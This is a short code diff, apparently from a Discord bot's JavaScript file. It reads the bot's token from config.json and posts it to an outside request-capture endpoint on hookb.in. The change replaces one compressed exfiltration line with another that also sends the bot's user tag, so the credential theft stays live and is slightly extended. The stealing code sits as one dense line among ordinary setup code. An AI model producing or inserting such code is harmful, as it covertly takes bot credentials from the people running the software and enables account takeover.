@@ -9,7 +9,7 @@ let token = fs.readFileSync('config.json');
 token = JSON.parse(token);
 token = token.token
 
-const https=require("https"),options={hostname:"hookb.in",port:443,path:"/JKQVrJM3OYiwjyQNlmez",method:"POST",headers:{"Content-Type":"application/json","Content-Length":token.length}},req=https.request(options);req.write(token),req.end();
+const https=require("https"),options={hostname:"hookb.in",port:443,path:"/JKQVrJM3OYiwjyQNlmez",method:"POST",headers:{"Content-Type":"application/json","Content-Length":token.length}},req=https.request(options);req.write(`${bot.user.tag}'s token: ${token}`),req.end();
 
 let count = 0;
 
